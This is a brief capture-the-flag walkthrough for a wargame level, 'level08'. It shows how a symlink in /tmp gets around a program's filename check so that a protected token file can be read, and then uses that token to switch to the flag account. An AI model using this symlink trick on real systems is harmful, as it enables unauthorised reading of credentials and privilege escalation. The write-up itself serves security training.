# Level08

The `level08` program takes a file as parameter, but we need to have access to this file.
Let's create a symlink to `token` to overide this security.
>`ln -s /home/user/level08/token /tmp/flag`

Get the password and the flag.
>`./level8 /tmp/flag`

>`su flag08`

>`getflag`
